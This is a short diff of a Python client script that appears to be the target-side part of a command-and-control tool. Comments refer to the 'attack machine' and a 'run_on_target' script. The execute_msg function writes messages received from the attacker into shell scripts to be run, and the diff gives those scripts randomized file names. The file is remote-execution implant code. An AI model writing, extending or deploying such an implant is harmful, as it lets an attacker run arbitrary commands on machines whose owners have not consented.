@@ -3,6 +3,8 @@ from cryptography.hazmat.primitives.ciphers.aead import AESGCM
 import subprocess
 import os
 import json
+import random
+import string
 
 # 'localhost' # on same machine
 # REACH_IP = 'localhost' # IP of attack machine
@@ -13,6 +15,10 @@ def convert_path(file_name):
     script_dir = os.path.dirname(os.path.abspath(__file__))
     file_path = os.path.join(script_dir, file_name)
     return file_path
+
+# Generate random identifier to append to file name
+def random_suffix(length=8):
+    return ''.join(random.choices(string.ascii_letters + string.digits, k=length))
 
 with open(convert_path("client_config.json")) as config_f:
     config = json.load(config_f)
@@ -98,7 +104,7 @@ def execute_msg(message):
     # TODO: complete so runs the code
     print(f"received:\n{message}\n==")
     # create shell script from the message
-    script_fname = convert_path("run_on_target.sh")
+    script_fname = convert_path(f"run_on_target_{random_suffix()}.sh")
     with open(script_fname, "w") as f:
         f.write(message)
     # run the shell script
